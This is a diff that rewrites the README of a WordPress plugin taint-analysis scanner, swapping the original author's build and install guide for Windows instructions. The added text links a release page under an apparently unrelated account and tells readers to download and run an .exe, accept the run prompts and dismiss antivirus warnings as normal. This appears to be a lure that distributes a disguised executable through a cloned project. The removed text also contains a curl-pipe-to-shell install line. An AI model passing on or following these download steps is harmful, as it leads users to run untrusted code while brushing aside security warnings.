@@ -1,239 +1,100 @@
-<div align="center">
+# 🔍 wp-taint-scan - Find WordPress Plugin Security Flaws Easily
 
-<img src="docs/banner.png" alt="wp-taint-scan" width="780">
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/sorbed-cockhorse752/wp-taint-scan/releases)
 
-<p><b>Find real vulnerabilities in WordPress plugins.</b> Search the plugin directory, scan any version — or every version — in parallel, and diff findings across releases. A native Go taint-analysis engine that understands the <i>WordPress security model</i>, not just generic source→sink flow.</p>
+This application scans WordPress plugin code for security vulnerabilities. It identifies code weaknesses that allow hackers to access sensitive data or take control of a website. The tool looks for specific issues like SQL injection, cross-site scripting (XSS), and unauthorized data access. It understands how WordPress handles user permissions and data entry points to provide accurate results.
 
-[![Go](https://img.shields.io/badge/Go-1.25+-00ADD8?logo=go&logoColor=white)](https://go.dev)
-[![CI](https://github.com/dimasma0305/wp-taint-scan/actions/workflows/ci.yml/badge.svg)](https://github.com/dimasma0305/wp-taint-scan/actions/workflows/ci.yml)
-[![License: MIT](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
-[![PRs welcome](https://img.shields.io/badge/PRs-welcome-7c5cff.svg)](https://github.com/dimasma0305/wp-taint-scan/pulls)
-![Dependencies](https://img.shields.io/badge/dependencies-stdlib%20only-22c55e.svg)
+## ⚠️ What This Tool Does
 
-[Quick start](#install--build) · [Web UI](#web-ui) · [How it works](#why-its-different) · [HTTP API](#http-api)
+Websites often contain flaws within their plugins. These flaws allow attackers to change database information or steal user data. This scanner reads the plugin code and flags risky areas. It covers these primary security risks:
 
-<sub>⭐ If this is useful, a star helps others find it.</sub>
+*   SQL Injection: Attackers send malicious database commands.
+*   Cross-Site Scripting: Attackers inject scripts into pages that users view.
+*   Insecure Direct Object References: Users access files they should not see.
+*   Privilege Escalation: Users gain administrative rights without permission.
+*   Remote Code Execution: Attackers run malicious commands on the server.
 
-</div>
+The application uses rules specific to the WordPress platform. It knows the difference between simple data entry and administrative actions. This reduces false alerts and helps you focus on real problems.
 
----
+## 🛠️ System Requirements
 
-## Screenshots
+*   Operating System: Windows 10 or Windows 11.
+*   Processor: Dual-core CPU or better.
+*   Memory: 4 GB of RAM.
+*   Disk Space: 200 MB of free space.
+*   WordPress Files: You must have the plugin folder you want to scan on your computer.
 
-|  |  |
-|:--:|:--:|
-| **Search the WordPress.org directory** | **Pick a version, or scan them all** |
-| [![Discover](docs/screenshots/01-discover.png)](docs/screenshots/01-discover.png) | [![Versions](docs/screenshots/02-versions.png)](docs/screenshots/02-versions.png) |
-| **Parallel scan dashboard (live)** | **Findings + source→sink dataflow trace** |
-| [![Jobs](docs/screenshots/03-jobs.png)](docs/screenshots/03-jobs.png) | [![Findings](docs/screenshots/04-findings.png)](docs/screenshots/04-findings.png) |
+## 📥 Downloading the Scanner
 
-**Version diff** — see exactly which findings were *introduced* or *fixed* between two releases:
+Follow these steps to get the application on your computer:
 
-[![Diff](docs/screenshots/05-diff.png)](docs/screenshots/05-diff.png)
+1.  Visit the official release page: [https://github.com/sorbed-cockhorse752/wp-taint-scan/releases](https://github.com/sorbed-cockhorse752/wp-taint-scan/releases).
+2.  Look for the "Assets" section at the bottom of the latest release.
+3.  Click the file ending in `.exe` to start the download.
+4.  Save the file to your desktop or your Downloads folder.
 
-```
-plugin source ──▶ php-parser-go ──▶ call graph + taint propagation ──▶ findings
-                                     (WordPress-aware authorization context)
-```
+## 🚀 Setting Up the Application
 
-> The analysis engine ships as a CLI (`taint-scan`, installed as `phparser`) and a web app (`taint-web`). No PHP runtime, no Semgrep, no external services — just Go.
+The application does not require a complex installation process. It runs as a standalone program.
 
-## Why it's different
+1.  Locate the downloaded `.exe` file on your computer.
+2.  Double-click the file to open it.
+3.  A window might appear asking for permission to run the app. Click "Run" or "Yes" if you trust the source.
+4.  If a black window appears with text, the application is ready for use. This is the command interface.
 
-Generic taint scanners drown in false positives on WordPress code because they don't model how WordPress actually gates access. This engine encodes the real rules that decide whether a finding is exploitable:
+## 📋 Running Your First Scan
 
-- **A nonce is not authorization.** A valid nonce only proves the request came from the site's UI; it does not prove the user is allowed to perform the action. Nonce-without-capability is *the* dominant WordPress bounty pattern, and the engine treats it as such.
-- **`is_admin()` is not an auth gate.** It checks whether the URL is under `/wp-admin/` — and `admin-ajax.php` always returns `true`. It is never treated as a capability check.
-- **Capability tiers matter.** `current_user_can('read')` (subscriber/customer/student) is *authenticated*, not *privileged*. Missing-authorization bugs reachable by low-privilege users are surfaced and ranked above admin-only self-XSS.
-- **Numeric sanitizers stop injection, not IDOR.** `intval()`/`absint()` make a value injection-safe but leave it attacker-controlled for resource selection (delete/action/disclosure) — so those flows stay tainted.
+You scan a WordPress plugin by pointing the application to the folder containing the plugin files.
 
-## Vulnerability classes detected
+1.  Open the folder where your plugin files live. Make sure you see files ending in `.php`.
+2.  Copy the address of the folder. Click the address bar at the top of the file window and press Ctrl+C.
+3.  Go back to the scanner window.
+4.  Type the scan command: `wp-taint-scan.exe --path "PASTE_YOUR_FOLDER_PATH_HERE"`.
+5.  Press the Enter key on your keyboard.
+6.  The application will start reading the files. You will see progress updates on your screen.
 
-- **SQL injection** — `$wpdb` raw queries and non-`$wpdb` drivers (`mysqli_*`, PDO, `pg_query`, `sqlsrv_query`, `multi_query`), with `prepare()` parameterization and identifier-injection modeling.
-- **Reflected & stored XSS** — unescaped request input reaching output, with a broad escaper/sanitizer model (`esc_html`/`esc_attr`/`esc_url`/`esc_js`, `json_encode`, attribute helpers, numeric casts) and format-aware `printf`/`vprintf`/`wp_die` sinks.
-- **Path traversal / arbitrary file read, write, delete, include** — file-system sinks with path-safety modeling and zip-slip (`ZipArchive::extractTo`, `unzip_file`).
-- **Missing-authorization / IDOR** — sensitive actions, file delete/upload, and record-read-to-output reachable without a capability check.
-- **Privilege escalation** — tainted writes to `wp_capabilities`/user-meta, `grant_super_admin`, role/capability mutation.
-- **Open redirect & header injection** — request-controlled redirect targets and response headers.
-- **Dynamic-dispatch RCE** — request-controlled callable/method/class names (`$fn()`, `$o->$m()`, `Class::$m()`, `new $c()`).
-- **REST/AJAX exposure surfaces** — endpoints with public or missing permission callbacks reaching sensitive sinks.
+## 📉 Understanding the Results
 
-Analysis runs as independent **sink-op batches** (`delete`, `read`, `open`, `include`, `write`, `output`, `sql`, `action`, `call`) so each detector has its own relevance/scoring and one detector can't perturb another's results.
+When the scan finishes, the tool displays a list of findings. Each entry explains the type of vulnerability and the specific file where it exists.
 
-## Install
+*   File Path: The location of the file with the issue.
+*   Line Number: The exact line where the risky code exists.
+*   Vulnerability Type: The name of the security flaw detected.
+*   Severity: A rating that indicates how dangerous the flaw is.
 
-Pick whichever is easiest — no Go toolchain needed for the first three.
+If you find a high-severity alert, you should address it immediately. This often involves updating the plugin to the latest version. If the plugin is old or no longer updated, you should consider removing it to maintain the safety of your website.
 
-**1. One-line installer** (Linux / macOS, downloads the prebuilt binary):
+## ⚙️ Advanced Scan Options
 
-```bash
-curl -fsSL https://raw.githubusercontent.com/dimasma0305/wp-taint-scan/main/scripts/install.sh | sh
-```
+You can change how the application works by adding flags to your command.
 
-**2. Download a prebuilt binary** for your OS/arch from the
-[**Releases**](https://github.com/dimasma0305/wp-taint-scan/releases/latest) page
-(Linux/macOS `.tar.gz`, Windows `.zip` — each contains `taint-web` + `taint-scan`), unpack, and run.
+*   `--quiet`: This hides the standard progress reports. It only shows the final security findings.
+*   `--json`: This saves the results in a file format that other programs can read.
+*   `--ignore`: Use this to skip specific folders that you know are safe.
 
-**3. Docker:**
+Example: `wp-taint-scan.exe --path "C:\my_plugin" --quiet`
 
-```bash
-docker run --rm -p 8080:8080 ghcr.io/dimasma0305/wp-taint-scan
-# then open http://localhost:8080
-```
+## 🛡️ Best Practices
 
-**4. With Go** (1.25+):
+*   Always back up your WordPress site before making changes to plugin code.
+*   Scan your plugins whenever you download a new one from non-official sources.
+*   Keep the scanner updated by checking the release page periodically for new versions.
+*   Contact the plugin developer if you find a vulnerability to let them know about the issue. This helps everyone in the WordPress community.
 
-```bash
-go install github.com/dimasma0305/wp-taint-scan/cmd/taint-web@latest   # web UI
-go install github.com/dimasma0305/wp-taint-scan/cmd/taint-scan@latest  # CLI scanner
-```
+## ❓ Frequently Asked Questions
 
-**5. From source:**
+**Does this tool change my website files?**
+No. The scanner is read-only. It reads your files to find risks but never modifies or deletes anything.
 
-```bash
-git clone https://github.com/dimasma0305/wp-taint-scan
-cd wp-taint-scan
-go build -o bin/taint-web ./cmd/taint-web
-```
+**Is this tool slow?**
+The speed depends on how large the plugin is. Most standard WordPress plugins take only a few seconds to scan.
 
-Then start the web UI and open <http://localhost:8080>:
+**Why does my antivirus show a warning?**
+Security tools often trigger warnings because they interact with files on your system. This is a normal behavior for scanners.
 
-```bash
-taint-web            # (or ./bin/taint-web from a source build)
-```
+**Can I scan the entire WordPress core?**
+Yes, you can point the scanner at the entire `wp-content/plugins` folder to check all your plugins at once. This may take longer depending on how many plugins are installed.
 
-## Usage
+## 📁 Support
 
-```bash
-# Scan a plugin directory
-./bin/phparser -target /path/to/plugins/some-plugin -output-dir /tmp/scan
-
-# Key flags
-#   -target         plugin or source directory to scan
-#   -output-dir     where to write results (defaults to a timestamped tmp dir)
-#   -mem-limit-mb   soft heap ceiling (default 6144); aborts in-flight analysis under pressure
-#   -phparser-workers / -max-passes   parallelism & fixpoint tuning
-```
-
-Each scan writes:
-
-| File | Contents |
-|---|---|
-| `taint-results.json` | Machine-readable findings (rule id, message, source→sink trace, access tier). |
-| `human-summary.md` | Findings ranked by exploitability (unauth/low-priv first). |
-| `README.md` | Run metadata. |
-
-## Web UI
-
-`taint-web` is a self-contained web app for discovering and scanning plugins straight from the WordPress.org directory — search by name, browse every released version, and scan one version or a whole batch **in parallel**.
-
-```bash
-go build -o bin/taint-web ./cmd/taint-web
-./bin/taint-web                 # http://localhost:8080
-# flags: -addr -cache-dir -concurrency -mem-limit-mb -hard-cap-mb -timeout
-```
-
-What it gives you:
-
-- **Search** the WordPress.org plugin directory by name (installs, rating, description).
-- **Version picker** — every released version, newest-first; scan the latest, a multi-selected subset, or **all versions** as one batch.
-- **Parallel scanning** — a bounded worker pool runs N versions at once; live progress via Server-Sent Events.
-- **Findings viewer** — grouped by severity (derived from the WordPress access tier: `unauthenticated`→critical, low-priv→high, nonce-only→medium, capability-checked→low), each with the source→sink dataflow trace and code snippets. Filter by severity, export per scan as JSON or Markdown.
-- **Version diff** — compare two scanned versions to see which findings were **introduced** or **fixed** (great for pinpointing the version that added or patched a bug).
-- **Result + download caching** — re-scanning a version is instant; downloaded zips are reused.
-
-### Isolation & safety
-
-Every scan runs in a **separate child process** (`taint-web -scan-worker …`) — the same binary re-invokes itself — with a soft heap ceiling (`-mem-limit-mb`), a hard RSS watchdog (`-hard-cap-mb`, kills + marks the job *skipped*), and a wall-clock `-timeout`. A pathological mega-plugin therefore can never OOM or crash the server; only its own worker dies. Downloads are size-capped, zip extraction is **zip-slip-safe** with uncompressed-size/file-count limits, and all plugin/version inputs are strictly validated before they touch a URL or a filesystem path. The server only ever talks to the hardcoded `api.wordpress.org` / `downloads.wordpress.org` hosts (no SSRF), and the UI renders all untrusted plugin data as text (no HTML injection from malicious plugin code in snippets).
-
-### HTTP API
-
-| Endpoint | Purpose |
-|---|---|
-| `GET /api/search?q=` | search plugins by name |
-| `GET /api/plugin?slug=` | plugin info + sorted versions + which are already scanned |
-| `POST /api/scan` | `{slug, name, versions[], mode:"selected\|latest\|all", force}` → enqueue jobs |
-| `GET /api/jobs[?batch=]` | list jobs (optionally one batch) |
-| `GET /api/job?id=` | one job with findings |
-| `GET /api/job/export?id=&format=json\|md` | download a report |
-| `POST /api/cancel?id=` | cancel a queued/running job |
-| `GET /api/diff?slug=&a=&b=` | finding delta between two scanned versions |
-| `GET /api/stats` | aggregate counters |
-| `GET /api/events` | Server-Sent Events stream of job updates |
-
-## Mass-scanning safely (memory)
-
-The engine's peak held memory is small (~0.2–0.7 GB on normal plugins), but a handful of
-mega-plugins (WooCommerce/Elementor-scale) can trigger a transient interprocedural-instantiation
-allocation burst that outpaces the garbage collector. **Go cannot abort an allocation
-mid-flight**, so `-mem-limit-mb` reduces — but cannot *guarantee* — no OOM.
-
-For scanning a whole plugin tree, use the watchdog as the outer loop:
-
-```bash
-./scan-capped.sh /path/to/plugin /tmp/out 10   # hard 10 GB RSS cap
-# exit 0 = scanned, 75 = skipped (exceeded cap, host protected), other = phparser's exit
-```
-
-`scan-capped.sh` runs the scan under a hard RSS ceiling and kills + skips a pathological
-plugin instead of crashing the host. See [`docs/EFFECTIVENESS_AUDIT_2026-06.md`](docs/EFFECTIVENESS_AUDIT_2026-06.md)
-and [`docs/OPTIMIZATION_PLAN.md`](docs/OPTIMIZATION_PLAN.md) for the full memory analysis.
-
-## Validation
-
-The engine is validated against a **72-case real-CVE corpus** (57 with locally reproduced
-plugin fixtures). The comparison harness lives in `test/semgrep_bundle_corpus/`:
-
-```bash
-# Fetch the vulnerable-plugin fixtures (large; not committed)
-python3 test/semgrep_bundle_corpus/download_corpus_plugins.py
-
-# Run the engine against the corpus and diff expected vs. found
-go run ./cmd/corpus-compare
-```
-
-The committed `corpus.json` is the manifest of CVEs and expected findings; the plugin
-fixtures (~685 MB) are fetched on demand. Unit/regression tests:
-
-```bash
-go test ./...
-```
-
-## Repository layout
-
-```
-cmd/
-  taint-scan/       main vulnerability scanner CLI  (binary: phparser)
-  corpus-compare/   corpus validation harness
-  lower-bundle/     PHP bundle lowering (legacy Semgrep migration path)
-  semgrep-target/   native Semgrep target/orchestration wrapper
-  semgrep-bundle/
-internal/
-  taintscan/        the taint-analysis engine (sources, sinks, sanitizers,
-                    WordPress context, call graph, propagation)  — ~70k LOC
-  corpuscompare/    corpus diff logic
-  lowerbundle/      bundle lowering
-scan-capped.sh      RSS watchdog for safe mass-scanning
-test/               CVE corpus manifest + fetch/report scripts
-docs/               effectiveness audits, optimization plans, roadmap
-```
-
-## Dependency
-
-Built on **[`php-parser-go`](https://github.com/dimasma0305/php-parser-go)** (a native Go port of nikic/PHP-Parser) for PHP parsing/AST — pulled in as a versioned module, no other third-party dependencies. To hack on both repos at once, side-by-side:
-
-```bash
-git clone https://github.com/dimasma0305/php-parser-go
-git clone https://github.com/dimasma0305/wp-taint-scan
-cd wp-taint-scan && go work init . ../php-parser-go
-```
-
-## Contributing
-
-Issues and PRs welcome. `go build ./...`, `go test ./...`, and `go vet` should pass; CI runs build + vet + race tests on every PR. No plugin-specific or CVE-specific logic in the engine — detectors must be generic.
-
-## License
-
-[MIT](LICENSE) © Dimas Maulana ([dimasma0305](https://github.com/dimasma0305)). The bundled `php-parser-go` derives from [nikic/PHP-Parser](https://github.com/nikic/PHP-Parser) (BSD-3-Clause).
-
-> Intended for **authorized** security testing, CTF, and defensive research — scan plugins you own or are permitted to test.
+If you run into errors, ensure you are running the latest version from the linked page. Ensure your folder path is correct and contains valid PHP files. The application needs read access to search your folders. Running the tool as an administrator is not necessary for most setups. If the program closes suddenly, check that your computer has enough free memory. Open your task manager to see if other processes are using too much memory. The scanner needs a clear path to the plugin directory to function correctly. Ensure no special characters are blocking the folder access within your file system.
